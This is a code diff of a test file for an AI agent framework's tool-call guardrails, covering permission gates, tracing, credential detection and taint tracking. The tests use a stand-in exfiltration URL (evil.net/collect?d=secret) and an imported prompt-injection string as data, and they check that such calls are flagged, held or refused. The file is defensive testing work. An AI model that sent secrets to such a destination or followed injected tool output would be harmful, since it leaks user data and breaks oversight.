@@ -3,7 +3,7 @@ import { TEST_OPENAI_KEY } from '../../src/guardrails/corpus/secrets.ts';
 import { INJ_IGNORE } from '../../src/guardrails/corpus/strings.ts';
 import { memoryCredentialSource } from '../../src/kernel/auth/credential-source.ts';
 import { AWAITING_USER_INPUT_STATUS } from '../../src/kernel/schema.ts';
-import { createKernelScope, type KernelScope } from '../../src/kernel/scope.ts';
+import type { KernelScope } from '../../src/kernel/scope.ts';
 import {
   executeRegisteredTool,
   lapsedGateFailure,
@@ -19,25 +19,23 @@ import {
   type TraceSpan,
 } from '../../src/observability/trace-span.ts';
 import { eventsOf, toolEventsOf, toolSnapshot } from '../fixtures/events.ts';
+import { createTestKernelScope as createKernelScope } from '../fixtures/provider-scope.ts';
 
 type Call = Parameters<typeof executeRegisteredTool>[0];
 type Stages = NonNullable<Call['stages']>;
-
 function check(actual: unknown, expected: unknown, label: string): void {
   if (JSON.stringify(actual) !== JSON.stringify(expected)) {
     throw new Error(`${label}: ${JSON.stringify(actual)} !== ${JSON.stringify(expected)}`);
   }
 }
-
 const KEY_IN_ARGS = `use ${TEST_OPENAI_KEY}`;
 const FINDING = z.object({ finding: z.string() });
-
 function profileOf(allow: string[], guardrails?: Profile['guardrails']): Profile {
   return {
     id: 'exec-c',
     type: 'text',
     identity: { handle: 'exec-c' },
-    models: { m: { protocol: 'openAi', provider: 'openrouter', apiId: 'test' } },
+    models: { m: { provider: 'openrouter', apiId: 'test' } },
     defaultModel: 'm',
     tools: { allow },
     inputs: { text: true },
@@ -45,7 +43,6 @@ function profileOf(allow: string[], guardrails?: Profile['guardrails']): Profile
     ...(guardrails ? { guardrails } : {}),
   };
 }
-
 function fnTool(name: string, over: Record<string, unknown> = {}): ToolDefinitionInput {
   return {
     type: 'function',
@@ -62,26 +59,25 @@ function fnTool(name: string, over: Record<string, unknown> = {}): ToolDefinitio
     ...over,
   } as ToolDefinitionInput;
 }
-
 function scopeOf(...defs: ToolDefinitionInput[]): KernelScope {
   const scope = createKernelScope();
   for (const def of defs) scope.tools.register(def);
   return scope;
 }
-
 const DOCS_AUTH = { slot: 'docs', service: 'Docs', type: 'api_key', headerName: 'X-Key' } as const;
-
 interface Run {
   events: TurnEvent[];
   settlement: ToolExecuteSettlement;
   span: TraceSpan | undefined;
   ends: number;
 }
-
 /** A traced run is opened under a real span tree; `ends` counts every `end` the call made on its span. */
 function tracer() {
   const tree = startTrace('host');
-  const state: { ends: number; opened: boolean } = { ends: 0, opened: false };
+  const state: {
+    ends: number;
+    opened: boolean;
+  } = { ends: 0, opened: false };
   const openSpan = (name: string, attributes: TraceAttributes): SpanHandle => {
     state.opened = true;
     const span = tree.root.child(name, { attributes });
@@ -100,7 +96,6 @@ function tracer() {
   const span = () => tree.collect().find((s) => s.name.startsWith('execute_tool'));
   return { openSpan, state, span };
 }
-
 interface RunArgs {
   scope: KernelScope;
   profile: Profile;
@@ -112,7 +107,6 @@ interface RunArgs {
   trace?: boolean;
   tools?: ToolRegistry;
 }
-
 async function run(args: RunArgs): Promise<Run> {
   const t = tracer();
   const exec = executeRegisteredTool({
@@ -133,23 +127,24 @@ async function run(args: RunArgs): Promise<Run> {
     events.push(next.value);
   }
 }
-
 function stagesOf(profile: Profile, ...handlers: Stages['handlers']): Stages {
   return { handlers, profile, step: 1, history: () => [], injectAllowed: false };
 }
-
 function attr(span: TraceSpan | undefined, key: string): unknown {
   return span?.attributes[key];
 }
-
 function content(value: unknown): unknown {
-  return (value as { $content?: unknown } | undefined)?.$content;
+  return (
+    value as
+      | {
+          $content?: unknown;
+        }
+      | undefined
+  )?.$content;
 }
-
 function spanEvents(span: TraceSpan | undefined, name: string) {
   return (span?.events ?? []).filter((e) => e.name === name);
 }
-
 function checksOf(span: TraceSpan | undefined) {
   return spanEvents(span, 'theorem.guardrail').map((e) => ({
     check: e.attributes.check,
@@ -157,7 +152,6 @@ function checksOf(span: TraceSpan | undefined) {
     duration: e.attributes.duration_ms,
   }));
 }
-
 async function withFetch<T>(fetchFn: typeof fetch, body: () => Promise<T>): Promise<T> {
   const original = globalThis.fetch;
   globalThis.fetch = fetchFn;
@@ -167,7 +161,6 @@ async function withFetch<T>(fetchFn: typeof fetch, body: () => Promise<T>): Prom
     globalThis.fetch = original;
   }
 }
-
 async function withClock<T>(ms: number, body: () => Promise<T>): Promise<T> {
   const original = performance.now;
   performance.now = () => ms;
@@ -177,20 +170,17 @@ async function withClock<T>(ms: number, body: () => Promise<T>): Promise<T> {
     performance.now = original;
   }
 }
-
 function jsonResponse(body: unknown, status = 200): Response {
   return new Response(JSON.stringify(body), {
     status,
     headers: { 'Content-Type': 'application/json' },
   });
 }
-
 const failureOf = (r: Run) => ({
   code: r.settlement.failure?.code,
   kind: r.settlement.failure?.kind,
   message: r.settlement.failure?.message,
 });
-
 Deno.test('lapsedGateFailure names the expired sign-in service, else the abandoned tool', () => {
   check(
     lapsedGateFailure('docs_search', 'Docs', undefined),
@@ -220,7 +210,6 @@ Deno.test('lapsedGateFailure names the expired sign-in service, else the abandon
     'blank service is no service',
   );
 });
-
 Deno.test('a refused gate settles as the failure its cause and sign-in name', async () => {
   const profile = profileOf(['plain', 'docs']);
   const scope = scopeOf(fnTool('plain'), fnTool('docs', { auth: DOCS_AUTH }));
@@ -229,7 +218,11 @@ Deno.test('a refused gate settles as the failure its cause and sign-in name', as
     label: string;
     tool: string;
     resume: NonNullable<NonNullable<Call['ctx']>['resume']>;
-    expected: { code: string; kind: string; message: string };
+    expected: {
+      code: string;
+      kind: string;
+      message: string;
+    };
   }[] = [
     {
       label: 'declined by default',
@@ -332,7 +325,6 @@ Deno.test('a refused gate settles as the failure its cause and sign-in name', as
     check(errors[0]?.failure.message, row.expected.message, `${row.label}: event message`);
   }
 });
-
 Deno.test('a call the person signed in for tells the model so before its result', async () => {
   const profile = profileOf(['docs', 'broken']);
   const scope = scopeOf(
@@ -371,7 +363,6 @@ Deno.test('a call the person signed in for tells the model so before its result'
   });
   check(approved.settlement.modelResult?.modelText?.includes(note), false, 'approval alone');
 });
-
 Deno.test('a refused call reaches post_tool with the call, and no body runs', async () => {
   let ran = 0;
   const profile = profileOf(['plain']);
@@ -420,7 +411,6 @@ Deno.test('a refused call reaches post_tool with the call, and no body runs', as
   check(r.settlement.denied, true, 'denied');
   check(r.settlement.callNotStarted, true, 'callNotStarted');
 });
-
 Deno.test('a traced call records who and what it ran for', async () => {
   const profile = profileOf(['plain', 'asks']);
   const scope = scopeOf(fnTool('plain'), fnTool('asks', { permission: 'always_confirm' }));
@@ -441,18 +431,15 @@ Deno.test('a traced call records who and what it ran for', async () => {
   check(attr(first.span, 'theorem.step'), 3, 'step');
   check('theorem.tool.approved' in (first.span?.attributes ?? {}), false, 'no approval asked');
   check(first.ends, 1, 'ended once');
-
   const asks = await run({ scope, profile, name: 'asks', trace: true });
   check(attr(asks.span, 'theorem.tool.permission'), 'always_confirm', 'permission is the tool own');
   check('theorem.step' in (asks.span?.attributes ?? {}), false, 'no step without a turn');
-
   const missing = await run({ scope, profile, name: 'nope', trace: true });
   check('theorem.tool.origin' in (missing.span?.attributes ?? {}), false, 'no origin');
   check('theorem.tool.permission' in (missing.span?.attributes ?? {}), false, 'no permission');
   check(attr(missing.span, 'theorem.tool.outcome'), 'error', 'unknown tool is an error');
   check(attr(missing.span, 'theorem.tool.failure.code'), 'unknown_tool', 'unknown tool code');
 });
-
 Deno.test('a traced resume records the host answer it carries', async () => {
   const profile = profileOf(['plain']);
   const scope = scopeOf(fnTool('plain'));
@@ -468,13 +455,17 @@ Deno.test('a traced resume records the host answer it carries', async () => {
     check('theorem.tool.approved' in (r.span?.attributes ?? {}), expected !== undefined, label);
   }
 });
-
 Deno.test('a traced call hands the tool its own span as ctx.traceparent', async () => {
   let seen: string | undefined;
   const profile = profileOf(['plain']);
   const scope = scopeOf(
     fnTool('plain', {
-      handler: (_input: unknown, ctx: { traceparent?: string }) => {
+      handler: (
+        _input: unknown,
+        ctx: {
+          traceparent?: string;
+        },
+      ) => {
         seen = ctx.traceparent;
         return { finding: 'ok' };
       },
@@ -486,7 +477,6 @@ Deno.test('a traced call hands the tool its own span as ctx.traceparent', async 
   check(untraced.span, undefined, 'no span without openSpan');
   check(seen, undefined, 'no traceparent without openSpan');
 });
-
 Deno.test('a traced call ends its span with the outcome of how it settled', async () => {
   const profile = profileOf(['plain', 'boom', 'asks', 'ask_user', 'crash', 'bad']);
   const scope = scopeOf(
@@ -515,7 +505,6 @@ Deno.test('a traced call ends its span with the outcome of how it settled', asyn
   };
   const preTool = (result: object) => (ctx: { stage: string }) =>
     ctx.stage === 'pre_tool' ? result : undefined;
-
   const table: {
     label: string;
     args: RunArgs;
@@ -621,7 +610,13 @@ Deno.test('a traced call ends its span with the outcome of how it settled', asyn
     check(attr(r.span, 'theorem.tool.outcome'), row.outcome, `${row.label}: outcome`);
     check(attr(r.span, 'theorem.tool.failure.code'), row.code, `${row.label}: failure code`);
     check(
-      (attr(r.span, 'theorem.tool.data') as { $json?: unknown } | undefined)?.$json,
+      (
+        attr(r.span, 'theorem.tool.data') as
+          | {
+              $json?: unknown;
+            }
+          | undefined
+      )?.$json,
       row.data,
       `${row.label}: data`,
     );
@@ -633,7 +628,6 @@ Deno.test('a traced call ends its span with the outcome of how it settled', asyn
     }
   }
 });
-
 Deno.test('a traced failure is a typed error span and what the model reads is on it', async () => {
   const profile = profileOf(['boom']);
   const scope = scopeOf(
@@ -653,7 +647,6 @@ Deno.test('a traced failure is a typed error span and what the model reads is on
   );
   check('theorem.tool.data' in (r.span?.attributes ?? {}), false, 'no data on failure');
 });
-
 Deno.test('a traced call that returns media records the parts the model reads', async () => {
   const profile = profileOf(['draw']);
   const scope = scopeOf(
@@ -666,14 +659,15 @@ Deno.test('a traced call that returns media records the parts the model reads', 
     }),
   );
   const r = await run({ scope, profile, name: 'draw', trace: true });
-  const parts = attr(r.span, 'theorem.tool.call.result.parts') as { type: string }[];
+  const parts = attr(r.span, 'theorem.tool.call.result.parts') as {
+    type: string;
+  }[];
   check(parts.length, 1, 'one part');
   check(parts[0]?.type, 'blob', 'part type');
   check(content(attr(r.span, 'gen_ai.tool.call.result')), 'drawn', 'text');
   const plain = await run({ scope: scopeOf(fnTool('draw')), profile, name: 'draw', trace: true });
   check('theorem.tool.call.result.parts' in (plain.span?.attributes ?? {}), false, 'no parts');
 });
-
 Deno.test('a gate and an unscoped guardrail event the call yields land on its span', async () => {
   const profile = profileOf(['asks', 'plain']);
   const scope = scopeOf(fnTool('asks', { permission: 'always_confirm' }), fnTool('plain'));
@@ -685,7 +679,6 @@ Deno.test('a gate and an unscoped guardrail event the call yields land on its sp
     { kind: 'permission', permission: 'always_confirm' },
     'gate',
   );
-
   const flagged = await run({
     scope,
     profile,
@@ -705,7 +698,6 @@ Deno.test('a gate and an unscoped guardrail event the call yields land on its sp
     'untimed decision observed from the stream',
   );
 });
-
 Deno.test('each tool-boundary check is timed on the span, once, with its decision', async () => {
   const profile = profileOf(['plain', 'boom']);
   const scope = scopeOf(
@@ -753,7 +745,6 @@ Deno.test('each tool-boundary check is timed on the span, once, with its decisio
   const unscoped = await run({ scope, profile, name: 'plain', trace: true });
   check(checksOf(unscoped.span), [], 'no timed checks without stage support');
 });
-
 Deno.test('the span a traced call opens is the one its stages and guards record on', async () => {
   const profile = profileOf(['plain']);
   const scope = scopeOf(fnTool('plain'));
@@ -768,7 +759,6 @@ Deno.test('the span a traced call opens is the one its stages and guards record 
   check(stageEvents.includes('theorem.guardrail'), true, 'checks land on the call span');
   check(r.span?.parentSpanId !== undefined, true, 'span is a child of the host span');
 });
-
 Deno.test('a call stopped by an abort ends its span cancelled and rethrows', async () => {
   const profile = profileOf(['plain']);
   const scope = scopeOf(fnTool('plain'));
@@ -799,7 +789,6 @@ Deno.test('a call stopped by an abort ends its span cancelled and rethrows', asy
   check(spanEvents(span, 'exception').length, 0, 'no exception recorded');
   check(t.state.ends, 1, 'ended once');
 });
-
 Deno.test('a call that throws ends its span as an error with the exception, and rethrows', async () => {
   const profile = profileOf(['explodes']);
   const scope = scopeOf(
@@ -836,7 +825,6 @@ Deno.test('a call that throws ends its span as an error with the exception, and 
   check(content(exceptions[0]?.attributes['exception.message']), 'kaboom', 'exception message');
   check(t.state.ends, 1, 'ended once');
 });
-
 Deno.test('a host that stops reading mid-call ends the span cancelled and closes the handler', async () => {
   let closed = false;
   const profile = profileOf(['streams']);
@@ -879,7 +867,6 @@ Deno.test('a host that stops reading mid-call ends the span cancelled and closes
   check(t.state.ends, 1, 'ended once');
   check(seen.at(-1), 'progress', 'read up to the progress event');
 });
-
 Deno.test('a call that finishes closes its span once, however it finished', async () => {
   const profile = profileOf(['plain', 'boom']);
   const scope = scopeOf(
@@ -895,7 +882,6 @@ Deno.test('a call that finishes closes its span once, however it finished', asyn
     check(r.ends, 1, `${name}: end calls`);
   }
 });
-
 Deno.test('an unregistered or snapshot-less builtin call fails as a request, never running', async () => {
   const profile = profileOf([]);
   const scope = scopeOf({
@@ -921,7 +907,6 @@ Deno.test('an unregistered or snapshot-less builtin call fails as a request, nev
     "Tool 'ghost' is not registered",
     'event',
   );
-
   const noSnapshot = await run({ scope, profile, name: 'native_search' });
   check(
     failureOf(noSnapshot),
@@ -938,7 +923,6 @@ Deno.test('an unregistered or snapshot-less builtin call fails as a request, nev
     "Tool 'native_search' is a provider builtin and requires a turn tool snapshot",
     'builtin without snapshot: event',
   );
-
   const enabled = await run({
     scope,
     profile,
@@ -971,7 +955,6 @@ Deno.test('an unregistered or snapshot-less builtin call fails as a request, nev
     'disabled builtin',
   );
 });
-
 Deno.test('a tool of a type the kernel cannot run fails as unknown, naming the tool', async () => {
   const profile = profileOf(['odd']);
   const odd = { type: 'odd', name: 'odd', access: 'read-only', permission: 'auto' };
@@ -984,7 +967,6 @@ Deno.test('a tool of a type the kernel cannot run fails as unknown, naming the t
   );
   check(r.settlement.callNotStarted, true, 'callNotStarted');
 });
-
 Deno.test('arguments carrying a credential are flagged before the call; clean ones raise nothing', async () => {
   const profile = profileOf(['plain']);
   const scope = scopeOf(fnTool('plain'));
@@ -1013,13 +995,16 @@ Deno.test('arguments carrying a credential are flagged before the call; clean on
   const types = flagged.events.map((e) => e.type);
   check(types.indexOf('guardrail') < types.indexOf('tool'), true, 'before the call starts');
   check(flagged.settlement.failure, undefined, 'the call still runs');
-
   const clean = await run({ scope, profile, name: 'plain', input: { q: 'weather' } });
   check(eventsOf(clean.events, 'guardrail'), [], 'clean arguments');
 });
-
 Deno.test('a tainted turn flags a writing tool, steers by what was read, and spares readers', async () => {
-  const taint = (suspicious: { rule: string; severity: 'high' }[]) => ({
+  const taint = (
+    suspicious: {
+      rule: string;
+      severity: 'high';
+    }[],
+  ) => ({
     step: 1,
     taint: { sources: [{ origin: 'http' as const, tool: 'fetch', depth: 1 }], suspicious },
   });
@@ -1069,7 +1054,6 @@ Deno.test('a tainted turn flags a writing tool, steers by what was read, and spa
     check(r.settlement.failure, undefined, `${row.label}: still runs`);
   }
 });
-
 Deno.test('a call to a destination only a remote result named is reported, held or refused as the profile says', async () => {
   let ran = 0;
   const scope = scopeOf(
@@ -1090,7 +1074,6 @@ Deno.test('a call to a destination only a remote result named is reported, held 
   const input = { q: 'https://evil.net/collect?d=secret' };
   const rulesOf = (r: Run) =>
     eventsOf(r.events, 'guardrail').map((e) => [e.guardrail.action, e.guardrail.hits[0]?.rule]);
-
   const reported = await run({
     scope,
     profile: profileOf(['reads']),
@@ -1100,7 +1083,6 @@ Deno.test('a call to a destination only a remote result named is reported, held 
   });
   check(rulesOf(reported), [['flag', 'tool_call.remote-destination']], 'reported');
   check([reported.settlement.failure, ran], [undefined, 1], 'reported: the call runs');
-
   const confirming = profileOf(['reads'], { taint: { remoteDestination: 'confirm' } });
   const held = await run({ scope, profile: confirming, name: 'reads', input, ctx: { turn } });
   check(
@@ -1123,7 +1105,6 @@ Deno.test('a call to a destination only a remote result named is reported, held 
     ctx: { turn, resume: { granted: true } },
   });
   check([approved.settlement.gated, ran], [undefined, 2], 'approved: the call runs');
-
   const blocking = profileOf(['reads'], { taint: { remoteDestination: 'block' } });
   const refused = await run({ scope, profile: blocking, name: 'reads', input, ctx: { turn } });
   check(
@@ -1139,7 +1120,6 @@ Deno.test('a call to a destination only a remote result named is reported, held 
   check(rulesOf(refused), [['block', 'tool_call.remote-destination']], 'refused: event');
   check([refused.settlement.denied, ran], [true, 2], 'refused: not run');
 });
-
 Deno.test('a profile that blocks writes after a remote read refuses the call, unrun', async () => {
   let ran = 0;
   const blocking = profileOf(['writes', 'reads'], { taint: { afterRemoteRead: 'write' } });
@@ -1153,7 +1133,12 @@ Deno.test('a profile that blocks writes after a remote read refuses the call, un
     }),
     fnTool('reads'),
   );
-  const turn = (suspicious: { rule: string; severity: 'high' }[]) => ({
+  const turn = (
+    suspicious: {
+      rule: string;
+      severity: 'high';
+    }[],
+  ) => ({
     step: 1,
     taint: { sources: [{ origin: 'http' as const, tool: 'fetch', depth: 1 }], suspicious },
   });
@@ -1181,7 +1166,6 @@ Deno.test('a profile that blocks writes after a remote read refuses the call, un
   check(errors[0]?.failure.code, 'tainted_turn', 'error event');
   const types = r.events.map((e) => (e.type === 'tool' ? `tool:${e.tool.phase}` : e.type));
   check(types.indexOf('guardrail') < types.indexOf('tool:error'), true, 'event before failure');
-
   const steered = await run({
     scope,
     profile: blocking,
@@ -1193,12 +1177,10 @@ Deno.test('a profile that blocks writes after a remote read refuses the call, un
     "Refused 'read-write' tool call: this turn has already read untrusted remote content (fetch), and that content tried to direct the agent toward an external destination.",
     'steered reason',
   );
-
   const reader = await run({ scope, profile: blocking, name: 'reads', ctx: { turn: turn([]) } });
   check(reader.settlement.failure, undefined, 'a reader is not refused');
   check(ran, 0, 'only readers ran');
 });
-
 Deno.test('a remote tool reads back fenced output; http and mcp both reach their own runner', async () => {
   const profile = profileOf(['remote_http', 'remote_mcp']);
   const scope = scopeOf(
@@ -1286,7 +1268,6 @@ Deno.test('a remote tool reads back fenced output; http and mcp both reach their
     );
   }
 });
-
 Deno.test('a host edit at post_tool is re-parsed by the remote tool schema and keeps its media', async () => {
   const profile = profileOf(['remote_http', 'remote_mcp']);
   const output = z.object({ answer: z.string() });
@@ -1359,7 +1340,6 @@ Deno.test('a host edit at post_tool is re-parsed by the remote tool schema and k
       'not the original',
     );
     check(edited.settlement.failure, undefined, 'no failure');
-
     const invalid = await run({
       scope,
       profile,
@@ -1375,7 +1355,6 @@ Deno.test('a host edit at post_tool is re-parsed by the remote tool schema and k
       },
       'invalid edit',
     );
-
     const media = await run({
       scope,
       profile,
@@ -1390,7 +1369,6 @@ Deno.test('a host edit at post_tool is re-parsed by the remote tool schema and k
     );
   });
 });
-
 Deno.test('a failure message is redacted by default, and follows the profile when it says otherwise', async () => {
   const throwing = (message: string) =>
     fnTool('fails', {
@@ -1399,7 +1377,6 @@ Deno.test('a failure message is redacted by default, and follows the profile whe
       },
     });
   const OMITTED = '[omitted - injection]';
-
   const injected = await run({
     scope: scopeOf(throwing(`lookup failed: ${INJ_IGNORE}`)),
     profile: profileOf(['fails']),
@@ -1419,7 +1396,6 @@ Deno.test('a failure message is redacted by default, and follows the profile whe
     'injection event',
   );
   check(injected.settlement.failure?.message, `lookup failed: ${INJ_IGNORE}`, 'raw failure kept');
-
   const leaked = await run({
     scope: scopeOf(throwing(`rejected ${KEY_IN_ARGS}`)),
     profile: profileOf(['fails']),
@@ -1432,7 +1408,6 @@ Deno.test('a failure message is redacted by default, and follows the profile whe
     [['detect.credentials']],
     'key event',
   );
-
   const ignored = await run({
     scope: scopeOf(throwing(`lookup failed: ${INJ_IGNORE}`)),
     profile: profileOf(['fails'], {
@@ -1446,7 +1421,6 @@ Deno.test('a failure message is redacted by default, and follows the profile whe
     true,
     'ignored crosses as given',
   );
-
   const clean = await run({
     scope: scopeOf(throwing('upstream timeout')),
     profile: profileOf(['fails']),
@@ -1455,7 +1429,6 @@ Deno.test('a failure message is redacted by default, and follows the profile whe
   check(eventsOf(clean.events, 'guardrail'), [], 'a clean failure raises nothing');
   check(clean.settlement.modelResult?.modelText?.includes('upstream timeout'), true, 'kept');
 });
-
 Deno.test('a remote result that steers the agent is annotated and reported as suspicious', async () => {
   const profile = profileOf(['remote_http', 'plain']);
   const scope = scopeOf(
@@ -1494,7 +1467,6 @@ Deno.test('a remote result that steers the agent is annotated and reported as su
     true,
     'annotated, not redacted',
   );
-
   const local = await run({ scope, profile, name: 'plain' });
   check(
     'suspicious' in (local.settlement.modelResult ?? {}),
